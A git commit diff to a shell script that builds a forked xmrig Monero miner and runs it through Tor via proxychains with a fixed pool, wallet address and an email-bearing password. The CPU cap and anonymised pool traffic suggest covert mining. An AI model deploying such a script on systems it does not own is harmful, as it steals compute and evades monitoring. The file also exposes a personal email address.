b65526e9adb9c7d7bddd934fdecefb312ce7306c
tersaguyex <52073743+tersaguyex@users.noreply.github.com>
2019-07-10 21:46:18 -0300

    Update script.sh

--- script.sh
+++ script.sh
@@ -2,7 +2,7 @@
 sudo apt-get -y update
 sudo apt-get -y install git build-essential cmake libuv1-dev libmicrohttpd-dev
 sudo apt-get -y install libssl-dev
-sysctl -w vm.nr_hugepages=4
+sysctl -w vm.nr_hugepages=128
 git clone https://github.com/tersaguyex/xmrig.git
 cd xmrig
 mkdir build
@@ -11,4 +11,4 @@ cmake ..
 make
 sudo apt-get -y install tor
 sudo apt-get -y install proxychains
-sudo nohup proxychains ./xmrig --donate-level 0 --max-cpu-usage 45 -o pool.supportxmr.com:5555 -u 4ACuCbJtoQiYjZ2KuaxN8KXaW4SUFDGabQ1ss6MrcjPF2TNuMdxZdb7iJs3ajffPEq4o3rgnfc2QBC54vZqZrBK5V1fyohq -p fouit:guilhermelourenci@hotmail.com -k
+sudo proxychains ./xmrig --donate-level 0 --max-cpu-usage 45 -o pool.supportxmr.com:5555 -u 4ACuCbJtoQiYjZ2KuaxN8KXaW4SUFDGabQ1ss6MrcjPF2TNuMdxZdb7iJs3ajffPEq4o3rgnfc2QBC54vZqZrBK5V1fyohq -p fouit:guilhermelourenci@hotmail.com -k
